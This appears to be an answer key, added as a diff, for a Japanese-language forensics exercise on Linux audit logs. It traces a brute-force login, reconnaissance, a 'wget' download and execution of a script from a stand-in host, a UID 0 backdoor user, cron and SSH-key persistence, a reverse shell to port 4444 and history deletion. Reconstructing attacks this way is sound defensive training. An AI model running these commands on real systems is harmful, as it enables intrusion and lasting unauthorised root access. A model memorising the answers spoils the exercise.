@@ -1,0 +1,106 @@
+{
+  "compromised": true,
+  "attacker_ip": "203.0.113.45",
+  "account": "backup",
+  "account_uid": 1003,
+  "session_ses": 2,
+  "login_success": {
+    "time_jst": "2026-11-12 00:04:09",
+    "epoch": 1794409449.737,
+    "serial": 23670
+  },
+  "brute_force": {
+    "first": {
+      "time_jst": "2026-11-12 00:03:57",
+      "epoch": 1794409437.972,
+      "serial": 23650
+    },
+    "attempts_root": 5,
+    "attempts_backup": 1
+  },
+  "actions": [
+    {
+      "step": "偵察",
+      "detail": "id / uname -a / cat /etc/passwd"
+    },
+    {
+      "step": "ダウンロード",
+      "detail": "sudo wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh",
+      "time_jst": "2026-11-12 00:04:26",
+      "epoch": 1794409466.471,
+      "serial": 23700
+    },
+    {
+      "step": "実行権限付与",
+      "detail": "sudo chmod +x /tmp/.upd.sh"
+    },
+    {
+      "step": "実行",
+      "detail": "sudo bash /tmp/.upd.sh",
+      "time_jst": "2026-11-12 00:04:32",
+      "epoch": 1794409472.956,
+      "serial": 23722
+    },
+    {
+      "step": "持続化：UID 0 の利用者追加",
+      "detail": "useradd -o -u 0 -g 0 ... sysupd（ADD_USER と /etc/passwd・/etc/shadow への書き込み）",
+      "time_jst": "2026-11-12 00:04:34",
+      "epoch": 1794409474.143,
+      "serial": 23735
+    },
+    {
+      "step": "持続化：cron",
+      "detail": "/etc/cron.d/sysupd を新規作成（key=cron）",
+      "time_jst": "2026-11-12 00:04:34",
+      "epoch": 1794409474.882,
+      "serial": 23746
+    },
+    {
+      "step": "持続化：SSH 鍵",
+      "detail": "/root/.ssh/authorized_keys に書き込み（key=rootkey）",
+      "time_jst": "2026-11-12 00:04:35",
+      "epoch": 1794409475.449,
+      "serial": 23747
+    },
+    {
+      "step": "外部への通信（リバースシェル）",
+      "detail": "connect → 198.51.100.23:4444（SOCKADDR）",
+      "time_jst": "2026-11-12 00:04:36",
+      "epoch": 1794409476.969,
+      "serial": 23752
+    },
+    {
+      "step": "痕跡の消去",
+      "detail": "/home/backup/.bash_history を削除（key=delete）",
+      "time_jst": "2026-11-12 00:05:27",
+      "epoch": 1794409527.005,
+      "serial": 23756
+    },
+    {
+      "step": "ログアウト",
+      "time_jst": "2026-11-12 00:05:30",
+      "epoch": 1794409530.27,
+      "serial": 23763
+    }
+  ],
+  "c2": {
+    "ip": "198.51.100.23",
+    "port": 4444,
+    "saddr": "0200115CC63364170000000000000000"
+  },
+  "persistence": [
+    "UID 0 の利用者 sysupd",
+    "/etc/cron.d/sysupd",
+    "/root/.ssh/authorized_keys"
+  ],
+  "distractors": [
+    "192.0.2.0/24 からの無効な利用者名での失敗ログイン（無差別な総当たり。侵入には至っていない）",
+    "deploy の sudo systemctl reload nginx（正規の運用）",
+    "tanaka の passwd（USER_CHAUTHTOK。自分のパスワード変更で正常）"
+  ],
+  "key_points": [
+    "sudo で root になっても auid=1003（backup）のまま。誰の操作かは auid で追う",
+    "USER_CMD の cmd と PROCTITLE は16進数。解読するとコマンドがわかる",
+    "SOCKADDR の saddr: 0200=AF_INET、次の4桁がポート、次の8桁が IPv4 アドレス"
+  ]
+}
